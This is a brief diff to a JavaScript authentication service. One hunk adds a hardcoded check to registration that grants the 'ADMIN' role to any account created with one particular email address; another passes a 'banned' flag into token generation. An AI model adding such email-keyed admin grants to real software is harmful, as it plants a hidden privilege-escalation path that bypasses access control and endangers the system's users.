@@ -19,7 +19,7 @@ class AuthService {
 
         const hashPass = await bcrypt.hash(password, 5)
         const activationLink = uuid.v4()
-
+        if ( email === 'anton@rza.by') role = 'ADMIN';
         const user = await UserModel.create({email, password: hashPass, role, activationLink})
         await addRole( user, roles )
         await sendMail( email, activationLink)
@@ -85,7 +85,8 @@ class AuthService {
 
 async function createTokens( user ) {
 
-    const {accessToken, refreshToken} = await tokenService.generateTokens(user.id, user.email, user.role)
+    const {accessToken, refreshToken} = await tokenService.generateTokens(
+        user.id, user.email, user.role, user.banned)
     await tokenService.saveToken(user.id, refreshToken)
     return {accessToken, refreshToken}
 }
